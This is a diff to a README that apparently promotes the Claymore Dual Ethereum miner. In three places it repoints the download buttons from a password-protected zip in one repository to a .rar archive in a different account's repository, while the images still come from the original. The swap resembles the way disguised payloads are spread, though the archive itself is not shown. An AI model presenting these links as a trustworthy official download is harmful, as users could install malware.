@@ -1,5 +1,5 @@
 <p align="center">
-<a href="https://github.com/Claymore-Dual/Claymore-Dual-Miner/releases/download/15.0/Claymore.s.dual.ethereum.miner.v15.0.-.widows.Password-claymore.zip" alt="claymore ethereum miner">
+<a href="https://github.com/BTC-Hub/Claymore-Dual-Miner/releases/download/ClaymoresDual/Claymore.s.Dual.Miner.rar" alt="claymore ethereum miner">
 <img src="https://github.com/Claymore-Dual/Claymore-Dual-Miner/blob/master/files/git-files/5eth.jpg" /></a>
 </p>
 
@@ -21,7 +21,7 @@ So, thank you so much for joining us!
 <p>Claymore Miner is high performance Ethereum (ETH) and ERC20 tokens  miner, with the official full Windows / Linux support.
 </p>
 <p align="center">
-<a href="https://github.com/Claymore-Dual/Claymore-Dual-Miner/releases/download/15.0/Claymore.s.dual.ethereum.miner.v15.0.-.widows.Password-claymore.zip" alt="claymore ethereum miner">
+<a href="https://github.com/BTC-Hub/Claymore-Dual-Miner/releases/download/ClaymoresDual/Claymore.s.Dual.Miner.rar" alt="claymore ethereum miner">
 <img src="https://github.com/Claymore-Dual/Claymore-Dual-Miner/blob/master/files/git-files/ethereum-hashrate.png" /></a>
 </p>
 
@@ -65,7 +65,7 @@ So, thank you so much for joining us!
 ## Download
 
 <p>
-<a href="https://github.com/Claymore-Dual/Claymore-Dual-Miner/releases/download/15.0/Claymore.s.dual.ethereum.miner.v15.0.-.widows.Password-claymore.zip" alt="claymore ethereum miner">
+<a href="https://github.com/BTC-Hub/Claymore-Dual-Miner/releases/download/ClaymoresDual/Claymore.s.Dual.Miner.rar" alt="claymore ethereum miner">
 <img src="https://github.com/Claymore-Dual/Claymore-Dual-Miner/blob/master/files/git-files/download-btn.png" width="300" ></a></p>
 
 * Binary releases: https://github.com/Claymore-Dual/Claymore-Dual-Miner/releases
